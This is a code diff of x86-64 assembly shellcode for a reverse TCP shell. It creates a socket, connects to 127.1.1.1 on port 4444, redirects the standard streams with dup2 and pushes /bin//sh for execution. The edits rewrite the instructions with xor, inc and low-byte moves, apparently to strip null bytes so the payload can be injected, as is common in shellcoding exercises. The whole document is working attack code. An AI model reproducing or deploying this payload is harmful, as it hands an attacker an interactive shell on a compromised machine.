@@ -8,11 +8,13 @@ _start:
 	; SOCK_STREAM = 1
 	; syscall number 41 
 
-
-	mov rax, 41
-	mov rdi, 2
-	mov rsi, 1
-	mov rdx, 0
+	xor rax, rax
+	mov al, 41
+	xor rdi, rdi
+	add dil, 0x2
+	xor rsi, rsi
+	inc rsi
+	xor rdx, rdx
 	syscall
 
 	; copy socket descriptor to rdi for future use 
@@ -22,24 +24,27 @@ _start:
 
 	; server.sin_family = AF_INET 
 	; server.sin_port = htons(PORT)
-	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
+	; server.sin_addr.s_addr = inet_addr("127.1.1.1")
 	; bzero(&server.sin_zero, 8)
 
 	xor rax, rax 
 
 	push rax
 	
-	mov dword [rsp-4], 0x0100007f
-	mov word [rsp-6], 0x5c11
-	mov word [rsp-8], 0x2
+	mov dword [rsp-4], 0x101017f
+	mov word [rsp-6], 0x5c11	; 4444
+	mov dword [rsp -0xa], eax
+	mov byte [rsp-8], 0x2
 	sub rsp, 8
 
 
 	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
 	
-	mov rax, 42
+	xor rax, rax
+	mov al, 42
 	mov rsi, rsp
-	mov rdx, 16
+	xor rdx, rdx
+	add rdx, 16
 	syscall
 
 
@@ -47,16 +52,19 @@ _start:
 
         ; dup2 (new, old)
         
-	mov rax, 33
-        mov rsi, 0
+	xor rax, rax
+	mov al, 33
+        xor rsi, rsi
         syscall
 
-        mov rax, 33
-        mov rsi, 1
+	xor rax, rax
+        mov al, 33
+        inc rsi
         syscall
 
-        mov rax, 33
-        mov rsi, 2
+	xor rax, rax
+        mov al, 33
+        inc rsi
         syscall
 
 
@@ -70,6 +78,7 @@ _start:
 
         ; push /bin//sh in reverse
 
+	xor rbx, rbx
         mov rbx, 0x68732f2f6e69622f
         push rbx
 
